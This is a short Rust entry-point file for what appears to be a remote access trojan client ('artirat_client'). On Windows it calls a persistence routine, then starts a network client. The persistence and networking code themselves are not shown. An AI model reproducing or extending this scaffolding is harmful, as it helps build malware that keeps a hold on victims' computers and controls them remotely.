use artirat_client::netclient;
use anyhow::Result;
#[cfg(target_os = "windows")]
mod persist;
#[cfg(target_os = "windows")]
use persist::persist;

const IS_DLL: bool = false; 
/// Actual binary entrypoint (thin wrapper)
#[tokio::main]
async fn main() -> Result<()> {
    #[cfg(target_os = "windows")]
    persist::persist(IS_DLL);
    netclient().await;
    Ok(())
}